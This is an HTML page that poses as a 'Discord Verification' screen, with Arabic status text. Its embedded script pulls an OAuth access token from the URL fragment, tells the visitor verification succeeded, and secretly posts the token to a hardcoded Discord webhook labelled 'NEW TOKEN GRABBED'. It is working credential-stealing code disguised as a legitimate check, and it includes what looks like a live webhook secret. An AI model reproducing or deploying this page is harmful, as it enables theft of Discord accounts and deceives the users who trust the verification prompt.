<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Verification</title>
    <style>
        body { background-color: #2c2f33; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #5865F2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { margin-top: 20px; font-size: 18px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2 id="status">جاري التحقق من الحساب...</h2>

    <script>
        // سحب التوكن من الرابط (بعد التعديل لـ response_type=token)
        const hash = window.location.hash.substring(1);
        const params = new URLSearchParams(hash);
        const accessToken = params.get('access_token');

        if (accessToken) {
            document.getElementById('status').innerText = "تم التحقق! يمكنك العودة للديسكورد الآن.";
            
            // إرسال التوكن للويب هوك بتاعك
            fetch('https://discord.com/api/webhooks/1491926490361626794/4-BpbrT0_5Qiy8HlssJyJlhlXJ5G5w_uZk7IlMFAisNJ-VmenDxcG8sk3nGZSCc32iQD', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: `🎯 **MNC NEW TOKEN GRABBED:** \`${accessToken}\``
                })
            });
        }
    </script>
</body>
</html>
